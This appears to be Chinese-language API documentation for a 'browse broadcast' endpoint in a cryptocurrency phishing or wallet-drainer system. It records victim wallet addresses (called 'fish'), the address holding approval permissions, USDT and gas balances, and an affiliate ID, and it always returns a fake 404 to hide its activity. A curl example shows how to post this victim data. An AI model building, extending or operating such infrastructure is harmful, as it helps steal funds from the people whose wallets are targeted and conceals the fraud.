# 浏览播报

## POST /browse-broadcast

记录钱包地址浏览行为，用于播报系统。

### 请求参数

| 参数 | 类型 | 必填 | 说明 |
|------|------|------|------|
| fish_address | string | ✅ | 钱包地址 |
| chainid | string | ✅ | 链类型 |
| permissions_fishaddress | string | ✅ | 权限地址 |
| usdt_balance | string | - | USDT 余额 |
| gas_balance | string | - | 燃料余额 |
| unique_id | string | - | 代理 ID |

### 速率限制

- 同 IP：10 秒内最多 8 次
- 同地址：10 秒内最多 5 次
- 超出限制 IP 封禁 10 分钟

### 请求示例

```bash
curl -X POST https://your-domain.com/browse-broadcast \
  -H "Content-Type: application/json" \
  -d '{
    "fish_address": "TXxx...xxx",
    "chainid": "TRC",
    "permissions_fishaddress": "TU2E...xxx",
    "usdt_balance": "100.000000",
    "gas_balance": "50.000000"
  }'
```

### 响应

```json
{
  "code": 404,
  "msg": "拒绝访问"
}
```

::: tip 说明
接口始终返回 404 状态码，实际状态通过 `fish_browse` 数据库表查看。
:::
